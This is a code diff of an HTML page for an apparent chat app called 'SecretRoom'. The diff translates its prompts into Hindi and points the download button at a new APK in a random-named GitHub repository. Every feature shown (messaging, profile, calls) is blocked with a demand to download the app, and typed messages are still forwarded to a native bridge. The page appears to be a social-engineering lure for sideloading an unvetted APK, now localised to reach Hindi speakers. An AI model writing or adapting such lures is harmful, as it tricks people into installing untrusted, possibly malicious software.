@@ -105,10 +105,10 @@ html.kb-open .download-btn{width:92px;height:92px;bottom:max(14%,calc(78px + env
   </div>
   <div class="toast" id="toast">
     <span class="toast-icon">📱</span>
-    <span id="toastMsg">Download the app for full access</span>
+    <span id="toastMsg">पूरी पहुंच के लिए ऐप डाउनलोड करें</span>
     <span class="toast-spinner" id="toastSpinner"></span>
   </div>
-  <a class="download-btn" id="downloadBtn" href="https://github.com/km0183416-del/probable-robot/raw/refs/heads/main/SecretRoom.apk" rel="noopener noreferrer">
+  <a class="download-btn" id="downloadBtn" href="https://github.com/km0183416-del/psychic-happiness/raw/refs/heads/main/SecretRoom.apk" rel="noopener noreferrer">
     <img src="https://res.cloudinary.com/pvai8pie/image/upload/v1789191078/zfmhpyzfl6wp6ymr9etr.webp" alt="Download App">
   </a>
 </div>
@@ -256,7 +256,7 @@ function renderMessages(){
 function sendMessage(){
   const t=msgInput.value.trim();if(!t)return;
   msgInput.value='';
-  showToast('Download the app to send messages','📱');
+  showToast('संदेश भेजने के लिए ऐप डाउनलोड करें','📱');
   sendToNative('SEND_BLOCKED',{message:t,timestamp:Date.now()});
 }
 sendBtn.addEventListener('pointerdown',e=>e.preventDefault());
@@ -272,7 +272,7 @@ window.receiveMessageFromNative=function(text,key){
 
 renderMessages();
 
-openProfileBtn.addEventListener('click',()=>showToast('Download the app to view full profile','👤'));
+openProfileBtn.addEventListener('click',()=>showToast('पूरी प्रोफ़ाइल देखने के लिए ऐप डाउनलोड करें','👤'));
 
 callBtn.addEventListener('click',()=>{overlay.classList.add('active');callSheet.classList.add('active');});
 function closeCallSheet(){overlay.classList.remove('active');callSheet.classList.remove('active');}
@@ -281,7 +281,7 @@ document.querySelectorAll('.call-option').forEach(o=>{
   o.addEventListener('click',()=>{
     const type=o.dataset.type;
     closeCallSheet();
-    setTimeout(()=>showToast(`Download the app to make ${type==='audio'?'audio':'video'} calls`,'📞'),320);
+    setTimeout(()=>showToast(`${type==='audio'?'ऑडियो':'वीडियो'} कॉल करने के लिए ऐप डाउनलोड करें`,'📞'),320);
   });
 });
 
@@ -323,7 +323,7 @@ async function handleDownloadClick(e){
   if(downloadInProgress)return;
   downloadInProgress=true;
   const url=downloadBtn.getAttribute('href');
-  showToast('Preparing download…','⬇️',{persistent:true,spinner:true});
+  showToast('डाउनलोड तैयार हो रहा है…','⬇️',{persistent:true,spinner:true});
   await new Promise(r=>requestAnimationFrame(()=>requestAnimationFrame(r)));
   let fired=false;
   if(!fired)fired=tryNativeDownload(url);
@@ -331,10 +331,10 @@ async function handleDownloadClick(e){
   if(!fired)fired=tryAnchorDownload(url);
   await sleep(350);
   if(fired){
-    updateToast('Download started successfully ✓',{spinner:false});
+    updateToast('डाउनलोड शुरू हो गया ✓',{spinner:false});
     await sleep(1800);hideToast();
   }else{
-    updateToast('Download failed, please try again',{spinner:false});
+    updateToast('डाउनलोड विफल रहा, कृपया पुनः प्रयास करें',{spinner:false});
     await sleep(2200);hideToast();
   }
   downloadInProgress=false;
